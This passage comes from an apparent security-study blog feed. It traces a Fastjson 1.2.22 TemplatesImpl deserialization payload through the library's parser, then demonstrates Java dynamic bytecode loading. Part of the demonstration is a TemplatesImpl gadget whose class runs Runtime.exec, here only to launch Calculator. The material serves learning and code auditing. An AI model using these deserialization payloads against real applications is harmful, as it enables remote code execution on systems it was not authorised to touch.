AEAHwAAAAIAIA==\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }}"</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> Feature<span class="token punctuation">.</span>SupportNonPublicField<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入JSON.parseObject</p><p><img src="/img/FastjsonDeserialization/image-20211028172304854.png" alt="image-20211028172304854"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/JSON.classjson#parseObject</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028172416304.png" alt="image-20211028172416304"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/JSON.classjson#parseObject进入DefaultJSONParser()</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028172456750.png" alt="image-20211028172456750"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#DefaultJSONParser 进入 JSONScanner</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028172712224.png" alt="image-20211028172712224"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/JSONScanner.classJSONScanner#JSONScanner注意这里的this.next()</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028172815557.png" alt="image-20211028172815557"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/JSONScanner.classJSONScanner#next其实就是取出我们输入的json格式的字符串的每一个值，每调用一次next，则取下一个的值给ch变量</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028173007919.png" alt="image-20211028173007919"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#DefaultJSONParsergetCurrent()就是获取当前的ch值，然后赋值给ch因为我们的payload第一个字符就是&quot;{&quot;,所以进入到红框里，token被赋值为12</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028173247168.png" alt="image-20211028173247168"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/JSON.class接下来回到了JSON#parseObject，运行到parser.parseObject(clazz, (Object)null)</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028173445805.png" alt="image-20211028173445805"></p><pre><code>文件：com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parseObject因为之前token被赋值为12，所以运行到derializer.deserialze(this, type, fieldName)</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028192512126.png" alt="image-20211028192512126"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson1.2.22.jar!/com/alibaba/fastjson/parser/deserializer/JavaObjectDeserializer.classJavaObjectDeserializer#deserialze三目运算，type是否为Class对象并且type不等于 `Object.class`，type不等于`Serializable.class`,条件为true调用`parser.parseObject`,条件为flase调用`parser.parse`。很显然这里会调用`parser.parse`方法</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028192703369.png" alt="image-20211028192703369"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parsetoken的值为12</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028192916078.png" alt="image-20211028192916078"></p><p>所以进入到红框里的代码</p><p><img src="/img/FastjsonDeserialization/image-20211028192848327.png" alt="image-20211028192848327"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parseObjectchar ch = lexer.getCurrent(); 取当前位置的字符，因为之前取了第一个字符&quot;{&quot;,并且下标+1，所以当前位置的字符是双引号进入到key = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;)</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028193112523.png" alt="image-20211028193112523"></p><pre><code>JSONLexerBase#scanSymbol这里注意，传递进来的参数quote的值是双引号，所以该方法的作用就是取出两个双引号之间的字符串内容while循环，不断的取出payload里的每一个字符，如果不是双引号则取下一个字符，直到取出双引号后，将前面的字符拼接成字符串后，返回回去</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028193601056.png" alt="image-20211028193601056"></p><p><img src="/img/FastjsonDeserialization/image-20211028193841675.png" alt="image-20211028193841675"></p><pre><code>回到com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parseObjectkey接收返回值@type</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028193939690.png" alt="image-20211028193939690"></p><pre><code>当匹配到@type这个标志符后，再取去双引号里的字符串，即@type的值，也就是类名`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028194513800.png" alt="image-20211028194513800"></p><p><img src="/img/FastjsonDeserialization/image-20211028194424262.png" alt="image-20211028194424262"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/util/TypeUtils.class然后调用loadclass动态加载该类TypeUtils#loadClass</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028194728657.png" alt="image-20211028194728657"></p><pre><code>回到com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parseObject</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028195340449.png" alt="image-20211028195340449"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/ParserConfig.classParserConfig#getDeserializer</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028195423827.png" alt="image-20211028195423827"></p><pre><code>ParserConfig#getDeserializer(Class&lt;?&gt; clazz, Type type)</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028195534488.png" alt="image-20211028195534488"></p><pre><code>ParserConfig#createJavaBeanDeserializer</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028195638056.png" alt="image-20211028195638056"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/util/JavaBeanInfo.classJavaBeanInfo#build到这里就很眼熟了，fastjson反序列化过程中寻找getter方法。</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028200848994.png" alt="image-20211028200848994"></p><p>找到了getOutputProperties()方法</p><p><img src="/img/FastjsonDeserialization/image-20211028201047159.png" alt="image-20211028201047159"></p><pre><code>回到com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/DefaultJSONParser.classDefaultJSONParser#parserObject</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028201350239.png" alt="image-20211028201350239"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson1.2.22.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.classJavaBeanDeserializer#deserialze(DefaultJSONParser parser, Type type, Object fieldName)</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028201542963.png" alt="image-20211028201542963"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.classJavaBeanDeserializer#deserialze</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028202228027.png" alt="image-20211028202228027"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/parser/JSONLexerBase.classJSONLexerBase#scanSymbol</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028202433665.png" alt="image-20211028202433665"></p><p>同理，取”\“之间的字符串</p><p><img src="/img/FastjsonDeserialization/image-20211028202605555.png" alt="image-20211028202605555"></p><p>然后进入到</p><p><img src="/img/FastjsonDeserialization/image-20211028203302946.png" alt="image-20211028203302946"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/util/IOUtils.classIOUtils#decodeBase64对bytecodes的值base64解码</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028203518650.png" alt="image-20211028203518650"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson-1.2.22.jar!/com/alibaba/fastjson/serializer/ObjectArrayCodec.classObjectArrayCodec#deserialze解码后</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028203605255.png" alt="image-20211028203605255"></p><p><code>_name、_tfactory、_outputProperties、_bytecodes</code>依次取出</p><p><img src="/img/FastjsonDeserialization/image-20211028203701891.png" alt="image-20211028203701891"></p><p><img src="/img/FastjsonDeserialization/image-20211028202605555.png" alt="image-20211028202605555"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson1.2.22.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.classJavaBeanDeserializer.class#smartMatch替换_字符为空</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028203905526.png" alt="image-20211028203905526"></p><pre><code>com/alibaba/fastjson/1.2.22/fastjson1.2.22.jar!/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.classFieldDeserializer#setValue当都取完后开始调用方法，而方法就是getOutputProperties</code></pre><p><img src="/img/FastjsonDeserialization/image-20211028204202629.png" alt="image-20211028204202629"></p><p>最后就是TemplatesImpl的利用链了</p><p><img src="/img/FastjsonDeserialization/image-20211028204239137.png" alt="image-20211028204239137"></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><pre><code>https://xz.aliyun.com/t/7027#toc-7https://www.cnblogs.com/nice0e3/p/14601670.html</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计之Fastjson反序列化调用链完整分析过程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计之Java动态加载字节码</title>
      <link href="/2021/10/28/java-dai-ma-shen-ji-zhi-java-dong-tai-jia-zai-zi-jie-ma/"/>
      <url>/2021/10/28/java-dai-ma-shen-ji-zhi-java-dong-tai-jia-zai-zi-jie-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="Java动态加载字节码"><a href="#Java动态加载字节码" class="headerlink" title="Java动态加载字节码"></a>Java动态加载字节码</h1><p><strong>注：本文为复现文和学习文，原创极少，参考了大量参考链接里的内容~感兴趣者自行阅读原作</strong></p><h2 id="0x01-双亲委派模式"><a href="#0x01-双亲委派模式" class="headerlink" title="0x01.双亲委派模式"></a>0x01.双亲委派模式</h2><h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1.工作原理"></a>1.工作原理</h3><p>如果一个类加载器收到了类加载请求，<strong>它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式</strong></p><h3 id="2-loadClass"><a href="#2-loadClass" class="headerlink" title="2.loadClass"></a>2.loadClass</h3><p>正如loadClass方法所展示的，当类加载请求到来时，<strong>先从缓存中查找该类对象，如果存在直接返回，如果不存在则交给该类加载去的父加载器去加载，倘若没有父加载则交给顶级启动类加载器去加载，最后倘若仍没有找到，则使用findClass()方法去加载</strong></p><h3 id="3-findClass"><a href="#3-findClass" class="headerlink" title="3.findClass"></a>3.findClass</h3><p>findClass()方法是在loadClass()方法中被调用的，当loadClass()方法中父加载器加载失败后，则会调用自己的findClass()方法来完成类加载，这样就可以保证自定义的类加载器也符合双亲委托模式。需要注意的是ClassLoader类中<strong>并没有实现findClass()方法的具体代码</strong>逻辑，取而代之的是抛出ClassNotFoundException异常，同时应该知道的是<strong>findClass方法通常是和defineClass方法一起使用的</strong></p><h3 id="4-defineClass"><a href="#4-defineClass" class="headerlink" title="4.defineClass"></a>4.defineClass</h3><p>defineClass()方法是用来将byte字节流解析成JVM能够识别的Class对象(ClassLoader中已实现该方法逻辑)，通过这个方法不仅能够通过class文件实例化class对象，也可以通过其他方式实例化class对象，如通过网络接收一个类的字节码，然后转换为byte字节流创建对应的Class对象，defineClass()方法通常与findClass()方法一起使用，一般情况下，在自定义类加载器时，会直接覆盖ClassLoader的findClass()方法并编写加载规则，取得要加载类的字节码后转换成流，然后调用defineClass()方法生成类的Class对象</p><pre><code>ClassLoader类有如下核心方法：loadClass(加载指定的Java类)findClass(查找指定的Java类)findLoadedClass(查找JVM已经加载过的类)defineClass(定义一个Java类)resolveClass(链接指定的Java类)</code></pre><p>Java类加载方式分为<strong>显式</strong>和<strong>隐式</strong>,<strong>显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例</strong>。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p><p>常用的类动态加载方式：</p><pre><code>// 反射加载TestHelloWorld示例Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);// ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</code></pre><p>Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法。</p><h2 id="0x02-URLClassLoader"><a href="#0x02-URLClassLoader" class="headerlink" title="0x02.URLClassLoader"></a>0x02.URLClassLoader</h2><p> DemoHelloWorld.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoHelloWorld</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">Hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello World."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"invoke ok"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DemoUrlClassLoad.java</p><pre><code>package com.URLClassLoad;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;public class DemoUrlClassLoad {    public static void main( String[] args ) throws Exception {        URL[] urls = {new URL(&quot;http://127.0.0.1:8000/&quot;)};        URLClassLoader loader = URLClassLoader.newInstance(urls);        Class c = loader.loadClass(&quot;DemoHelloWorld&quot;);        Object o = c.newInstance();        //反射获取method方法        Method method = o.getClass().getMethod(&quot;Hello&quot;);        //反射去调用执行method方法        String str = (String) method.invoke(o);        System.out.println(str);    }}public class DemoHelloWorld {    public String Hello() {        System.out.println(&quot;Hello World.&quot;);        return &quot;invoke ok&quot;;    }}</code></pre><p>编译DemoHelloWorld.java</p><p><code>javac DemoHelloWorld.java</code></p><p>将编译好的DemoHelloWorld.class放置Web服务下</p><p><img src="/img/JavaZijiema/fdf6adfd-c84d-4f66-a493-c168dfe65e0d.png" alt="img"></p><p>通过URLClassLoader成功的加载</p><p><img src="/img/JavaZijiema/56f166ce-3718-4f6d-8a41-6f7da645ff5c.png" alt="img"></p><h2 id="0x03-defineClass"><a href="#0x03-defineClass" class="headerlink" title="0x03.defineClass"></a>0x03.defineClass</h2><p>DemoHelloWorld如果不存在于我们的classpath，那么我们可以使用自定义类加载器重写findClass方法，然后在调用defineClass方法的时候传入DemoHelloWorld类的字节码的方式来向JVM中定义一个DemoHelloWorld类，最后通过反射机制就可以调用DemoHelloWorld类的Hello方法了。</p><pre><code>package com.DemoDefineClass;public class DemoHelloWorld {    public String Hello() {        System.out.println(&quot;Hello World.&quot;);        return &quot;invoke ok&quot;;    }}</code></pre><p><img src="/img/JavaZijiema/image-20211027203221858.png" alt="image-20211027203221858"></p><p><code>javac DemoHelloWorld.java</code>编译</p><p> DemoToBytes.java</p><pre><code>package com.DemoDefineClass;import sun.misc.IOUtils;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.IOException;import java.io.InputStream;import java.util.Arrays;public class DemoToBytes {    public static void main(String[] args) throws IOException {        InputStream fis = new FileInputStream(&quot;src/main/java/com/DemoDefineClass/DemoHelloWorld.class&quot;);        byte[] bytes = IOUtils.readFully(fis, -1, false);        System.out.println(Arrays.toString(bytes));    }}</code></pre><p>得到DemoHelloWorld.class的字节码</p><p><img src="/img/JavaZijiema/816edcdf-97a4-4543-8358-b3155bce6960.png" alt="img"></p><p> DemoDefineClass.java</p><pre><code>package com.DemoDefineClass;import java.lang.reflect.Method;class DemoDefineClass extends ClassLoader {    // TestHelloWorld类名    private static String testClassName = &quot;com.DemoDefineClass.DemoHelloWorld&quot;;    // TestHelloWorld类字节码    private static byte[] testClassBytes = new byte[]{            -54, -2, -70, -66, 0, 0, 0, 60, 0, 31, 10, 0, 2, 0, 3, 7, 0, 4, 12, 0, 5, 0, 6, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 9, 0, 8, 0, 9, 7, 0, 10, 12, 0, 11, 0, 12, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 8, 0, 14, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 46, 10, 0, 16, 0, 17, 7, 0, 18, 12, 0, 19, 0, 20, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 8, 0, 22, 1, 0, 9, 105, 110, 118, 111, 107, 101, 32, 111, 107, 7, 0, 24, 1, 0, 14, 68, 101, 109, 111, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 72, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 68, 101, 109, 111, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 0, 33, 0, 23, 0, 2, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 25, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 26, 0, 0, 0, 6, 0, 1, 0, 0, 0, 1, 0, 1, 0, 27, 0, 28, 0, 1, 0, 25, 0, 0, 0, 39, 0, 2, 0, 1, 0, 0, 0, 11, -78, 0, 7, 18, 13, -74, 0, 15, 18, 21, -80, 0, 0, 0, 1, 0, 26, 0, 0, 0, 10, 0, 2, 0, 0, 0, 3, 0, 8, 0, 4, 0, 1, 0, 29, 0, 0, 0, 2, 0, 30    };    @Override    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {        // 只处理TestHelloWorld类        if (name.equals(testClassName)) {            // 调用JVM的native方法定义TestHelloWorld类            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);        }        return super.findClass(name);    }    public static void main(String[] args) {        // 创建自定义的类加载器        DemoDefineClass loader = new DemoDefineClass();        try {            // 使用自定义的类加载器加载TestHelloWorld类            Class testClass = loader.loadClass(testClassName);            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();            Object testInstance = testClass.newInstance();            // 反射获取hello方法            Method method = testInstance.getClass().getMethod(&quot;Hello&quot;);            // 反射调用hello方法,等价于 String str = t.hello();            String str = (String) method.invoke(testInstance);            System.out.println(str);        } catch (Exception e) {            e.printStackTrace();        }    }}</code></pre><p><strong>流程：loadClass过程中，因为双亲委派机制，在父类加载器找不到com.DemoDefineClass.DemoHelloWorld类时，最后通过自定义的findClass去加载，然后调用defineClass()方法生成类的Class对象</strong></p><p><img src="/img/JavaZijiema/b00b13f5-7128-4271-82b5-fe6d1fe15b0b.png" alt="img"></p><h2 id="0x04-利用TemplatesImpl加载字节码"><a href="#0x04-利用TemplatesImpl加载字节码" class="headerlink" title="0x04.利用TemplatesImpl加载字节码"></a>0x04.利用TemplatesImpl加载字节码</h2><p>defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的 ClassLoader#defineClass 是一个native方法</p><p>下面是简单的代码，来演示如何让系统的 defineClass 来直接加载字节码：</p><p> DemoHelloWorld.java</p><pre><code>package com.DemoTemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class DemoHelloWorld extends AbstractTranslet {    public void transform(DOM document, SerializationHandler[] handlers)            throws TransletException {}    public void transform(DOM document, DTMAxisIterator iterator,                          SerializationHandler handler) throws TransletException {}    public DemoHelloWorld() throws IOException {        super();        System.out.println(&quot;Hello World&quot;);        Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);//        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    }}</code></pre><p>编译并base64编码</p><pre><code>Javac DemoHelloWorld.javacat DemoHelloWorld.class | base64</code></pre><p><img src="/img/JavaZijiema/32481c14-5ba7-468f-9ca0-49ecd35c91c5.jpg" alt="img"></p><p> DemoTemplatesImpl.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>DemoTemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span><span class="token keyword">import</span> sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>BASE64Decoder<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTemplatesImpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQALAoABgAdCQAeAB8IACAKACEAIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAmTGNvbS9EZW1vVGVtcGxhdGVzSW1wbC9EZW1vSGVsbG9Xb3JsZDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEAE0RlbW9IZWxsb1dvcmxkLmphdmEMABkAGgcAJgwAJwAoAQALSGVsbG8gV29ybGQHACkMACoAKwEAJGNvbS9EZW1vVGVtcGxhdGVzSW1wbC9EZW1vSGVsbG9Xb3JsZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAsACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAA0ACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAEACQAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAoAAAAOAAMAAAAPAAQAEAAMABEACwAAAAwAAQAAAA0ADAANAAAAAQAbAAAAAgAc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取属性</span>        Field _name <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field _bytecode <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field _tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置属性可访问</span>        _name<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _bytecode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token 